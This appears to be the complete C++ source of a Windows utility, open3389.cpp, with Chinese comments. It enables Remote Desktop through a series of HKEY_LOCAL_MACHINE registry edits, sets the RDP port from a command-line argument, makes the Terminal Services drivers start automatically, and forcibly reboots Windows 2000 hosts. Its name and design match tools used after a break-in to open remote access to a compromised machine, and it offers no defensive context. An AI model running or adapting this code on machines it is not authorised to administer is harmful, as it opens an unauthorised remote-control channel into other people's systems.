// open3389.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
//用于修改字符串类型键值
void CreateStringReg(HKEY hRoot,char *szSubKey,char* ValueName,char *Data)
{
	HKEY hKey;
	//打开注册表键，不存在则创建它
	long lRet=RegCreateKeyEx(hRoot,szSubKey,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,NULL);
    if (lRet!=ERROR_SUCCESS)
	{
		printf("error no RegCreateKeyEx %s\n", szSubKey);
		return ;
	}
	//修改注册表键值，没有则创建它
	lRet=RegSetValueEx(hKey,ValueName,0,REG_SZ,(BYTE*)Data,strlen(Data));
	 if (lRet!=ERROR_SUCCESS)
	 {
		 printf("error no RegSetValueEx %s\n", ValueName);
		 return ;
	 }
	RegCloseKey(hKey);
}

//用于修改数字类型键值
void CreateDWORDReg(HKEY hRoot,char *szSubKey,char* ValueName,DWORD Data)
{
	HKEY hKey;
	//打开注册表键，不存在则创建它
	long lRet=RegCreateKeyEx(hRoot,szSubKey,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,NULL);
    if (lRet!=ERROR_SUCCESS)
	{
		printf("error no RegCreateKeyEx %s\n", szSubKey);
		return ;
	}
	DWORD dwSize=sizeof(DWORD);
	//修改注册表键值，没有则创建它
	lRet=RegSetValueEx(hKey,ValueName,0,REG_DWORD,(BYTE*)&Data,dwSize);
	 if (lRet!=ERROR_SUCCESS)
	 {
		 printf("error no RegSetValueEx %s\n", ValueName);
		 return ;
	 }
	RegCloseKey(hKey);
}

//重启计算机函数
void Reboot()
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;
	if(!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hToken))
		return;
	LookupPrivilegeValue(NULL,SE_SHUTDOWN_NAME,&tkp.Privileges[0].Luid);
	tkp.PrivilegeCount=1;
	tkp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(hToken,FALSE,&tkp,0,(PTOKEN_PRIVILEGES)NULL,0);
    ExitWindowsEx(EWX_REBOOT|EWX_FORCE,0);

}

int main(int argc, char* argv[])
{
	DWORD Port=atoi(argv[1]);
	CreateStringReg(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\netcache","Enabled","0");
    CreateDWORDReg(HKEY_LOCAL_MACHINE,"SOFTWARE\\Policies\\Microsoft\\Windows\\Installer","EnableAdminTSRemote",0x00000001);
    CreateStringReg(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon","ShutdownWithoutLogon","0");
    CreateDWORDReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server","TSEnabled",0x00000001);
    CreateDWORDReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\TermDD","Start",0x00000002);
    CreateDWORDReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\TermService","Start",0x00000002);
	CreateDWORDReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server","fDenyTSConnections",0x00000001);
    CreateDWORDReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\RDPTcp","PortNumber",Port);
	CreateDWORDReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp","PortNumber",Port);
    CreateDWORDReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp","PortNumber",Port);
    CreateStringReg(HKEY_USERS,".DEFAULT\\Keyboard Layout\\Toggle","Hotkey","2");
    CreateDWORDReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server","fDenyTSConnections",0x00000000);
	OSVERSIONINFO osver={sizeof(OSVERSIONINFO)};
	//得到系统版本号
	GetVersionEx(&osver);
	//判断是不是windows 2000，是，则重启计算机
	if(osver.dwMajorVersion==5&&osver.dwMinorVersion==0)
		Reboot();



	return 0;
}
